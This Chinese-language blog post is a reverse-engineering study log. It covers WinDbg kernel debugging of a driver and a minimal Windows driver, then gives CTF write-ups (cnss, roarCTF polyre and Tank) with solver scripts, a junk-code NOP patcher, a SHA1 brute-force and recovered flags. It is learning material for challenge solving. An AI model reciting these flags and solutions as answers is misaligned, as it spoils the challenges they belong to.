<h2 id="驱动逆向"><a href="#驱动逆向" class="headerlink" title="驱动逆向"></a>驱动逆向</h2><p>驱动逆向写起来还是有点恐怖的。。。<br>踩了很多坑<br>首先最重要的就是调试<br>虚拟机配好环境后用windbg连<br>设置好entrypoint然后再虚拟机中加载sys驱动<br>windbg成功断下<br>改下参数后就可以解密了<br><img src="6.jpg" srcset="/img/loading.gif" lazyload alt="6"><br>下面写下大致调试步骤<br>管理员运行windbg<br>File -&gt; Kernel Debugging -&gt; com<br><img src="7.png" srcset="/img/loading.gif" lazyload alt="7"><br>照样配置好<br>然后能看到回显<br><img src="8.png" srcset="/img/loading.gif" lazyload alt="8"><br>下面点击break<br><img src="9.png" srcset="/img/loading.gif" lazyload alt="9"><br>这边已经连接上了<br>然后设置断点</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">bp</span> 驱动模块名称+驱动PE结构入口点函数偏移<br><span class="hljs-comment">// 如：bp DriverEnum+0x1828</span><br></code></pre></td></tr></table></figure>
<p>bp DancingKeys+0x8000<br>接下去输入g<br>让虚拟机运行<br>然后加载驱动<br>本来是想c语言写了编译运行后加载驱动<br>但是失败了<br>后来问了下夜影师傅。。。。。。成功填坑<br>下面就是基本调试了</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">lm ：表示列举虚拟机加载和卸载的内核模块起始地址和结束地址。<br>bu、bp ：下断点。<br>u、uf ：反汇编指定地址处的代码。<br>dd ： 查看指定地址处的数据。<br>dt ： 查看数据类型定义。<br><span class="hljs-symbol">F10:</span>  步过<br><span class="hljs-symbol">F11:</span>  步入<br><span class="hljs-symbol">ed:</span>   修改值<br><span class="hljs-symbol">dd:</span>   以dd显示值<br></code></pre></td></tr></table></figure>
<h3 id="驱动学习"><a href="#驱动学习" class="headerlink" title="驱动学习"></a>驱动学习</h3><p>学习一波驱动编程<br>以后可以出点沙雕赛题<br>当然肯定不会一次性学完的。。。慢慢来<br>下面是最基本的驱动</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;ntddk.h&gt;<br>NTSTATUS <span class="hljs-constructor">Unload(PDRIVER_OBJECT <span class="hljs-params">driver</span>)</span><br>&#123;<br>	<span class="hljs-constructor">DbgPrint(<span class="hljs-string">&quot;BYE&quot;</span>)</span>;<br>	return STATUS_SUCCESS;<br>&#125;<br>NTSTATUS <span class="hljs-constructor">DriverEntry(PDRIVER_OBJECT <span class="hljs-params">driver</span>, PUNICODE_STRING <span class="hljs-params">reg_path</span>)</span><br>&#123;<br>	<span class="hljs-constructor">DbgPrint(<span class="hljs-string">&quot;HELLO&quot;</span>)</span>;<br>	return STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>特别简单啊和linux内核模块编程差不多<br>一个入口函数和卸载函数<br>卸载函数不写的话只能关机卸载了。。。</p>
<h2 id="Android逆向"><a href="#Android逆向" class="headerlink" title="Android逆向"></a>Android逆向</h2><p>稍微结合着视频教程学了会<br>大致了解了安卓的架构(不然有时候问问题听都听不懂)<br><img src="15.png" srcset="/img/loading.gif" lazyload alt="15"><br>主要还是基于linux内核<br>还有平时逆向分析中分析native和java层<br>这个其实早就知道了。。。就是不知道为啥。。。算是填坑了<br><img src="16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
<h1 id="cnss"><a href="#cnss" class="headerlink" title="cnss"></a>cnss</h1><p>cnss是电子科大给新生的一个平台<br>有道不错的题目可以康康<br><img src="17.png" srcset="/img/loading.gif" lazyload alt="17"><br>这道题目过了俩天还是没人出<br>当时拿到题目算了下时间，30分钟出的flag<br>难度确实有点，但都是基础可以秒<br><img src="18.png" srcset="/img/loading.gif" lazyload alt="18"><br>大致流程如上<br>smc_init中有mprotect函数明显修改权限<br>下面有个pwdcheck<br>看下<br><img src="19.png" srcset="/img/loading.gif" lazyload alt="19"><br>其实是个原装的sm4算法<br>百度c源码直接解出pwd<br>key和最终比较都给了<br><img src="20.png" srcset="/img/loading.gif" lazyload alt="20"><br>然后是最后的smc操作<br>看上去操作很简单事实上是迷惑行为<br>调试发现是个vm<br>//个人总结了vm的速写法，很快就能看出来在干啥<br>就是把输入与之前的pwd xor<br>然后比较<br>不难，但是能让人眼前一亮<br>和国赛那个bbvvmm有神似之处<br>需要对加密算法熟知，当然你即使不知道这是sm4可以直接百度特征码</p>
<p>又上了道题<br>关于花的<br>有一说一，这平台题目确实不错，题出的挺好<br>特别是最近这俩题<br>说下这个junkcode</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">a = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0&#123;&#125;_!~?,.&#x27;</span><br>t1 = [<span class="hljs-number">0x000ed02e</span>,<span class="hljs-number">0x0014519f</span>,<span class="hljs-number">0x00173801</span>,<span class="hljs-number">0x00173801</span>,<span class="hljs-number">0x001c683c</span>,<span class="hljs-number">0x0002aebe</span>,<span class="hljs-number">0x00169d98</span>,<span class="hljs-number">0x001872b0</span>,<span class="hljs-number">0x0017d3cd</span>,<span class="hljs-number">0x000fb9dc</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00053d52</span>,<span class="hljs-number">0x0001b055</span>,<span class="hljs-number">0x00169d98</span>,<span class="hljs-number">0x000ed02e</span>,<span class="hljs-number">0x000fb9dc</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00028ad0</span>,<span class="hljs-number">0x0014e08c</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00053d52</span>,<span class="hljs-number">0x000400e9</span>,<span class="hljs-number">0x000ed02e</span>,<span class="hljs-number">0x0012b367</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00063088</span>,<span class="hljs-number">0x001872b0</span>,<span class="hljs-number">0x0014519f</span>,<span class="hljs-number">0x0002064f</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00049854</span>,<span class="hljs-number">0x0014e08c</span>,<span class="hljs-number">0x0004ccef</span>,<span class="hljs-number">0x000fb9dc</span>,<span class="hljs-number">0x001dcfeb</span>]<br>a1 = [<span class="hljs-number">0x000DEF38</span>,<span class="hljs-number">0x000E5DB5</span>,<span class="hljs-number">0x000ED02E</span>,<span class="hljs-number">0x000F4429</span>,<span class="hljs-number">0x000FB9DC</span>,<span class="hljs-number">0x0010330E</span>,<span class="hljs-number">0x0010ADF3</span>,<span class="hljs-number">0x00112C92</span>,<span class="hljs-number">0x0011AC91</span>,<span class="hljs-number">0x00122E46</span>,<span class="hljs-number">0x0012B367</span>,<span class="hljs-number">0x001339DB</span>,<span class="hljs-number">0x0013C416</span>,<span class="hljs-number">0x0014519F</span>,<span class="hljs-number">0x0014E08C</span>,<span class="hljs-number">0x001572C3</span>,<span class="hljs-number">0x0016068B</span>,<span class="hljs-number">0x00169D98</span>,<span class="hljs-number">0x00173801</span>,<span class="hljs-number">0x0017D3CD</span>,<span class="hljs-number">0x001872B0</span>,<span class="hljs-number">0x001914F1</span>,<span class="hljs-number">0x0019B886</span>,<span class="hljs-number">0x001A6136</span>,<span class="hljs-number">0x001B0B25</span>,<span class="hljs-number">0x001BB82B</span>,<span class="hljs-number">0x0001CCDB</span>,<span class="hljs-number">0x0001E827</span>,<span class="hljs-number">0x0002064F</span>,<span class="hljs-number">0x00022559</span>,<span class="hljs-number">0x000246FC</span>,<span class="hljs-number">0x0002677C</span>,<span class="hljs-number">0x00028AD0</span>,<span class="hljs-number">0x0002AEBE</span>,<span class="hljs-number">0x0002D36C</span>,<span class="hljs-number">0x0004325F</span>,<span class="hljs-number">0x000463FC</span>,<span class="hljs-number">0x00049854</span>,<span class="hljs-number">0x0004CCEF</span>,<span class="hljs-number">0x00050401</span>,<span class="hljs-number">0x00053D52</span>,<span class="hljs-number">0x00057717</span>,<span class="hljs-number">0x0005B355</span>,<span class="hljs-number">0x0005F1B4</span>,<span class="hljs-number">0x00063088</span>,<span class="hljs-number">0x00067189</span>,<span class="hljs-number">0x0006B49C</span>,<span class="hljs-number">0x0006F836</span>,<span class="hljs-number">0x00073FDF</span>,<span class="hljs-number">0x000787AC</span>,<span class="hljs-number">0x0007D183</span>,<span class="hljs-number">0x00081DA9</span>,<span class="hljs-number">0x00086BD6</span>,<span class="hljs-number">0x0008BA1F</span>,<span class="hljs-number">0x00090C8A</span>,<span class="hljs-number">0x000960CD</span>,<span class="hljs-number">0x0009B52E</span>,<span class="hljs-number">0x000A0DA3</span>,<span class="hljs-number">0x000A67F1</span>,<span class="hljs-number">0x000AC440</span>,<span class="hljs-number">0x000B2065</span>,<span class="hljs-number">0x0001B055</span>,<span class="hljs-number">0x001C683C</span>,<span class="hljs-number">0x001DCFEB</span>,<span class="hljs-number">0x000D16FA</span>,<span class="hljs-number">0x00008D9E</span>,<span class="hljs-number">0x001E8784</span>,<span class="hljs-number">0x0003D223</span>,<span class="hljs-number">0x00014D71</span>,<span class="hljs-number">0x00017C33</span>]<br>f = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in range(35):</span><br><span class="hljs-string">    for j in range(len(a1)):</span><br><span class="hljs-string">        if t1[i] == a1[j]:</span><br><span class="hljs-string">            f += a[j]</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">print f</span><br><span class="hljs-string">print len(f)</span><br><span class="hljs-string">#cnss&#123;8rute_F0rce_7o_F@ck_Jun3_CoDe&#125;</span><br></code></pre></td></tr></table></figure>
<p>直接打表解决，我打的表漏了个@。。。但是能猜出来<br>主要的花是俩种<br>一个是call影响栈指针<br><img src="22.png" srcset="/img/loading.gif" lazyload alt="22"><br>还有一个就是普通的垃圾填充了<br><img src="23.png" srcset="/img/loading.gif" lazyload alt="23"><br>全部填充nop即可</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span> = open(‘run.exe’,’rb’).read()<br><span class="hljs-attribute">data</span> = data.replace(‘\x<span class="hljs-number">60</span>\x<span class="hljs-number">61</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">50</span>\x<span class="hljs-number">58</span>\x<span class="hljs-number">53</span>\x<span class="hljs-number">5</span>b’,’\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>’) #花指令机器码替换为nop<br><span class="hljs-attribute">open</span>(‘run_dejunk.exe’,’wb’).write(data)<br></code></pre></td></tr></table></figure>
<p>jmp的辣鸡代码写不出脚本。。。如果单纯匹配机器码的话有其他指令也会存在0xE8<br>然后就是具体判断<br><img src="24.png" srcset="/img/loading.gif" lazyload alt="24"><br>就在这<br>具体加密在<br><img src="25.png" srcset="/img/loading.gif" lazyload alt="25"><br>观察汇编即可发现每次加密一个字节<br>加密完就比较<br>所以可以打表来写这题。。。<br>但这也正是这题想表达的junkcode，题目出的挺不错的。<br>如果加密出的难一点可能会死一片<br>好在是exe，换成elf angr一跑就出</p>
<p>又上了一题<br>我佛了<br>暂时日不出。。。<br>主要是壳。。。<br>upx 3.95最新的壳<br>估计改了什么东西。。。<br>//以前遇到壳直接脱壳机的我现在gg了<br>但是upx -d还是能脱但是不能运行<br>不像是自校验。。。<br>静态分析发现有花，花还是好去的<br><img src="26.png" srcset="/img/loading.gif" lazyload alt="26"><br>就是返回到shr     ebx, 7指令+1处<br>直接patch完<br><img src="27.png" srcset="/img/loading.gif" lazyload alt="27"><br>可以看到大致流程是先判断是不是cnss{}格式<br>长度为38<br><img src="28.png" srcset="/img/loading.gif" lazyload alt="28"><br>然后进行取表后xor操作。。。<br>最后直接比较判断。。。<br>由于不能调试很蛋疼。。。看不太懂。。。<br>没办法，只好去学一波脱壳了<br>//day2<br>脱壳是不可能的<br>这辈子都不可能的<br>调试了一波<br>发现有类似反调试的东西，直接忽略了<br><img src="29.png" srcset="/img/loading.gif" lazyload alt="29"><br>看完后整体逻辑大致如上<br>有一种crc128的感觉<br>实在不知道怎么逆向<br>问了下出题人果然。。。就是个crc<br>学一波crc<br>//10.20<br>打巅峰极客比赛暂时咕咕咕<br>看了波crc32感觉逆不了<br>后来得知当消息长度小于等于验证长度即可逆向。。。<br>佛了，赶紧学一波<br>好吧。。。tctf 2019原题<br>是个密码逆向。。。搞不来</p>
<h1 id="roarCTF"><a href="#roarCTF" class="headerlink" title="roarCTF"></a>roarCTF</h1><p>逆向签到。。。实在太菜了后面写不出啥</p>
<h2 id="polyre"><a href="#polyre" class="headerlink" title="polyre"></a>polyre</h2><p>是个很恐怖的ollvm。。。<br>学到了点新东西<br>拿到ollvm的题一般我都是猜。。。<br>扫了一眼大致看了看判断在memcmp那<br>下断点输入一堆a发现每8个byte出现了重复<br>那就是说每8byte加密一次<br>然后具体看看啥加密<br>在所有有操作命令处下断点然后看。。。发现是把每八个输入看成long int<br>然后不断地*2 ^0xB0004B7679FA26B3LL<br>调试了发现没有规律可循就懵逼了。。。当时才打完公测。。。比较晕<br>就没有继续看，后来在学长的告知下发现有个工具。。。<br>以前看过那个腾讯安全发的文章。。。然后工具不能用<br>后才来知道怎么用。。。<br>用工具反混淆后好看了很多<br><img src="21.png" srcset="/img/loading.gif" lazyload alt="21"><br>其实是看成了signed long int<br>然后判断是否大于等于0<br>大于则乘2<br>否则乘2后xor<br>64次后进行比较<br>因为有溢出。。。写逆算法时懵逼了<br>后来发现可逆。。。通过判断奇偶来选择高位补<br>裂开来</p>
<h2 id="Tank"><a href="#Tank" class="headerlink" title="Tank"></a>Tank</h2><p>开坦克。。。<br>直接看dll<br>主要逻辑就是爆破，当时逻辑分析出来了就是不知道为什么写脚本一直有问题就没有爆破出<br>后来还是整出来了<br>我佛了</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import hashlib<br><br>data = [<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]<br>]<br><br>text = <span class="hljs-string">&#x27;&#x27;</span><br>for i in range(<span class="hljs-number">21</span>):<br>    for j in range(<span class="hljs-number">17</span>):<br>        text += str(data[i][j])<br>text = list(text)<br><br>for i in range(len(text)):<br>    if text[i] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>        temp = list(text)<br>        temp[i] = <span class="hljs-string">&#x27;8&#x27;</span><br>        for j in range(i + <span class="hljs-number">1</span>, len(text)):<br>            if text[j] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                temp[j] = <span class="hljs-string">&#x27;8&#x27;</span><br>                for k in range(j + <span class="hljs-number">1</span>, len(text)):<br>                    if text[k] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                        temp[k] = <span class="hljs-string">&#x27;8&#x27;</span><br>                        temp2 = <span class="hljs-string">&#x27;&#x27;</span>.join(temp)<br>                        if hashlib.sha1(<span class="hljs-string">&#x27;clearlove9&#x27;</span> + temp2).hexdigest() == <span class="hljs-string">&#x27;3f649f708aafa7a0a94138dc3022f6ea611e8d01&#x27;</span>:<br>                            print <span class="hljs-string">&#x27;clearlove9&#x27;</span> + temp2<br>                            print <span class="hljs-string">&quot;success&quot;</span><br>                        temp[k] = <span class="hljs-string">&#x27;1&#x27;</span><br>                temp[j] = <span class="hljs-string">&#x27;1&#x27;</span><br>        temp[i] = <span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure>
<p> python写代码能力还是不怎么厉害啊<br> 当时好像是因为加密的时候是个list才导致爆破不出<br> 应该改成str的</p>
<h1 id="中科大校赛"><a href="#中科大校赛" class="headerlink" title="中科大校赛"></a>中科大校赛</h1><p>难</p>
<h2 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h2><p>又看到了kvm<br>看来这个坑必须填了<br>我佛了<br>参考链接<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Bozh/p/5753379.html">https://www.cnblogs.com/Bozh/p/5753379.html</a></p>
